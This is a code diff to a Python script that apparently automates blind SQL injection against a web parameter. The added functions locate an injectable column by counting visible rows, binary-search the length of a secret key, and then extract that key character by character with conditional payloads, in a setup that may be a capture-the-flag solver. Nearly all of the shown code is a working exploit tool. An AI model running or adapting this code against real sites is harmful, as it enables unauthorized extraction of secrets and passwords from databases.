@@ -98,7 +98,10 @@ def find_param(url: str, list_of_columns: list,
 
 
 def find_column_position(url: str, list_of_columns: list, payload: str,
-                         p: str, finds: str, cook={}) -> int:
+                         p: str, finds: str, cook={}) -> list:
+    max_rows = 10
+    m_row = 0
+    index_m_row = 0
     for i in range(len(list_of_columns)):
         tmp = list_of_columns[i]
         list_of_columns[i] = finds
@@ -106,12 +109,52 @@ def find_column_position(url: str, list_of_columns: list, payload: str,
         response = get_request(url, param, cook)
         soup = BeautifulSoup(response, 'html.parser')
         ret = soup.find(string=re.compile('rows'))
-        if str(len(list_of_columns)) in ret:
-            print(ret, i)
-            return i
+        # Find max of visible rows
+        for j in range(max_rows):
+            if str(j) in ret:
+                if j > m_row:
+                    m_row = j
+                    index_m_row = i
         list_of_columns[i] = tmp
+    if m_row:
+        list_of_columns[index_m_row] = finds
+        return [m_row, list_of_columns]
     print('column position not found')
     exit(1)
+
+
+def find_key_len(url: str, payload: str,
+                 p: str, m_row: str, cook={}) -> int:
+    left = -1
+    right = 30
+    while right > left + 1:
+        middle = (left + right) // 2
+        param = {p: payload % f'>{middle},1,0)'}
+        response = get_request(url, param, cook)
+        if m_row in response:
+            left = middle
+        else:
+            right = middle
+    return right
+
+
+def find_binary(url: str, payload: str,
+                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
+    result = ''
+    for i in range(1, len_of_key + 1):
+        a = left
+        b = right
+        while b - a != 0:
+            middle = a + (b - a) // 2 + 1
+            param = {p: payload % (i, f'<{middle},1,0)')}
+            response = get_request(url, param, cook)
+            if m_row in response:
+                b = middle - 1
+            else:
+                a = middle
+        print(chr(a))
+        result += chr(a)
+    return result
 
 
 def extract_pass(response: str, pass_r: str) -> str:
